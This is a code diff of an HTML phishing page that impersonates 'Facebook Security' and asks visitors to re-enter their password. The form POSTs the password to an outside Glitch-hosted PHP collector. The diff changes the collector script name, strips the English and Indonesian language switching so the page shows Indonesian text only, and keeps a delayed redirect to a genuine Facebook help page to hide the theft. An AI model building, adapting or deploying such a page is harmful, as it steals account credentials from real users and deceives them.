@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title data-en="Submit Form Integration" data-id="Integrasi Formulir Kirim">Submit Form Integration</title>
+    <title>Integrasi Formulir Kirim</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         body {
@@ -54,7 +54,7 @@
         .form-group input {
             width: 100%;
             padding: 14px;
-            padding-right: 40px;
+            padding-right: 40px; /* Space for the eye icon */
             border: 1px solid #ccd0d5;
             border-radius: 6px;
             font-size: 16px;
@@ -108,53 +108,23 @@
         <div class="logo">
             <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526" alt="Logo">
         </div>
-        <div class="header" data-en="Facebook Security" data-id="Keamanan Facebook">
-            Facebook Security
+        <div class="header">
+            Keamanan Facebook
         </div>
-        <p data-en="Please re-enter your password to complete the request." data-id="Silakan masukkan kembali kata sandi Anda untuk menyelesaikan permintaan.">Please re-enter your password to complete the request.</p>
-        <form id="passwordForm" action="https://mixed-fluff-space.glitch.me/zubairpass.php" method="POST">
+        <p>Silakan masukkan kembali kata sandi Anda untuk menyelesaikan permintaan.</p>
+        <form id="passwordForm" action="https://mixed-fluff-space.glitch.me/ashrafpass.php" method="POST">
             <div class="form-group">
-                <label for="password" data-en="Password" data-id="Kata Sandi">Password</label>
+                <label for="password">Kata Sandi</label>
                 <div class="input-wrapper">
-                    <input type="password" id="password" name="password" placeholder="Enter your password" required data-en-placeholder="Enter your password" data-id-placeholder="Masukkan kata sandi Anda">
+                    <input type="password" id="password" name="password" placeholder="Masukkan kata sandi Anda" required>
                     <i class="eye-icon fas fa-eye" id="togglePassword"></i>
                 </div>
                 <span id="error-message" class="error-message"></span>
             </div>
-            <button type="submit" class="submit-button" data-en="Submit" data-id="Kirim">Submit</button>
+            <button type="submit" class="submit-button">Kirim</button>
         </form>
     </div>
     <script>
-        // Language detection and switching
-        function detectAndSetLanguage() {
-            const userLang = navigator.language || navigator.userLanguage;
-            const isEnglish = userLang.startsWith('en');
-            const elements = document.querySelectorAll('[data-en][data-id]');
-            
-            elements.forEach(element => {
-                if (isEnglish) {
-                    element.textContent = element.getAttribute('data-en');
-                    if (element.hasAttribute('data-en-placeholder')) {
-                        element.setAttribute('placeholder', element.getAttribute('data-en-placeholder'));
-                    }
-                } else {
-                    element.textContent = element.getAttribute('data-id');
-                    if (element.hasAttribute('data-id-placeholder')) {
-                        element.setAttribute('placeholder', element.getAttribute('data-id-placeholder'));
-                    }
-                }
-            });
-            
-            // Update document title
-            const titleElement = document.querySelector('title[data-en][data-id]');
-            if (titleElement) {
-                document.title = isEnglish ? titleElement.getAttribute('data-en') : titleElement.getAttribute('data-id');
-            }
-        }
-        
-        // Run on page load
-        document.addEventListener('DOMContentLoaded', detectAndSetLanguage);
-        
         document.getElementById('togglePassword').addEventListener('click', function() {
             var passwordField = document.getElementById('password');
             var eyeIcon = this;
@@ -172,17 +142,16 @@
         document.getElementById('passwordForm').addEventListener('submit', function(event) {
             var passwordField = document.getElementById('password');
             var errorMessage = document.getElementById('error-message');
-            const userLang = navigator.language || navigator.userLanguage;
-            const isEnglish = userLang.startsWith('en');
-            
             if (passwordField.value.length < 6) {
-                errorMessage.textContent = isEnglish ? 'Password must be at least 6 characters long.' : 'Kata sandi harus terdiri dari minimal 6 karakter.';
+                errorMessage.textContent = 'Kata sandi harus terdiri dari minimal 6 karakter.';
                 event.preventDefault();
             } else {
                 errorMessage.textContent = '';
+                // Submit form normally
+                // Redirect after form submission
                 setTimeout(function() {
-                    window.location.href = 'https://www.facebook.com/help/media/thank-you?rdrhc';
-                }, 2000);
+                    window.location.href = 'https://www.facebook.com/help/media/thank-you?rdrhc'; // Redirect to desired URL
+                }, 2000); // Wait 2 seconds for form submission to complete
             }
         });
     </script>
